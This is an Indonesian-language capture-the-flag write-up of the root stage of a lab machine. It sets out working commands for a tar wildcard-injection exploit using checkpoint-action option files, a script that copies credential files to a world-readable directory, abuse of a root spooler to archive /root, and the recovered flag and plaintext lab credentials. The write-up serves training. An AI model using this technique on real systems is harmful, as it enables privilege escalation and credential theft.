# Record Keeper (Root) — Eksploitasi / Solver

[← Overview](16-record-keeper-root.md) · [Index](index.md)

### 3.1 Strategi

1. Dapatkan shell `node` lewat Node2Shell.
2. Enumerasi sudo dan wrapper archive.
3. Siapkan direktori `/tmp/tarinj` yang berisi script `x` dan dua file
   bernama opsi tar.
4. Trigger wrapper sebagai `ops`; tar mengeksekusi `sh x`.
5. Script `x` mencuri kredensial ops dan menulis job spool `target=/root`.
6. Tunggu spooler root, salin arsip, ekstrak `root.txt`.

### 3.2 Langkah exploit

#### a) Enumerasi dari shell node

```bash
id
sudo -n -l
cat /usr/local/bin/record-archive
ls -l /etc/nexus
ls -ld /srv/record-spool /var/backups/records
cat /app/src/spooler.js
```

Temuan:

```text
(ops) NOPASSWD: /usr/local/bin/record-archive
cd "$target"; tar -czf "$out" *
/etc/nexus/ops.creds   root:ops 0640
/etc/nexus/spool.token root:ops 0640
/srv/record-spool      writable oleh group ops
spooler.js             root, consume *.job tiap 2 detik
```

#### b) Siapkan payload tar

`[REKONSTRUKSI]` Script `x` di bawah merekonstruksi aksi yang dicatat di
notes: copy kredensial, tulis job, tunggu arsip, copy arsip ke
`/tmp/opsexfil`.

```bash
mkdir -p /tmp/tarinj
cd /tmp/tarinj

cat > x <<'SH'
#!/bin/sh
mkdir -p /tmp/opsexfil
cp /etc/nexus/ops.creds  /tmp/opsexfil/ 2>/dev/null
cp /etc/nexus/spool.token /tmp/opsexfil/ 2>/dev/null

cat > /srv/record-spool/rootarc.job <<'JOB'
id=rootarc
action=archive
target=/root
JOB

for i in $(seq 1 20); do
  [ -f /var/backups/records/rootarc.tar.gz ] && break
  sleep 1
done

cp /var/backups/records/rootarc.tar.gz /tmp/opsexfil/ 2>/dev/null
chmod -R 777 /tmp/opsexfil
SH

chmod +x x

# Dua file dengan nama opsi tar
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x'
```

#### c) Trigger wrapper sebagai ops

```bash
sudo -n -u ops /usr/local/bin/record-archive /tmp/tarinj
```

Di dalam wrapper, `cd "$target"` masuk ke `/tmp/tarinj`, lalu `tar -czf "$out" *`
membaca `--checkpoint=1` dan `--checkpoint-action=exec=sh x` sebagai opsi.
Tar mengeksekusi `sh x` sebagai `ops`.

#### d) Tunggu spooler root

Spooler memindai `/srv/record-spool/*.job` setiap 2 detik. Job:

```text
id=rootarc
action=archive
target=/root
```

menghasilkan:

```text
/var/backups/records/rootarc.tar.gz
```

Script `x` menyalin arsip itu ke `/tmp/opsexfil/`.

#### e) Ekstrak root flag

```bash
tar -xOzf /tmp/opsexfil/rootarc.tar.gz ./root.txt
```

### 3.3 Output

```text
$ tar -xOzf /tmp/opsexfil/rootarc.tar.gz ./root.txt
NFX{sp00l3r_4rch1v3_r00t_pwn3d}
```

Kredensial ops yang berhasil dicuri (dikonfirmasi di notes, tidak diperlukan
untuk langkah akhir):

```text
ops:0ps#Sp00l2026
spool token: SPOOL-7f3c9a1e4b2d
```
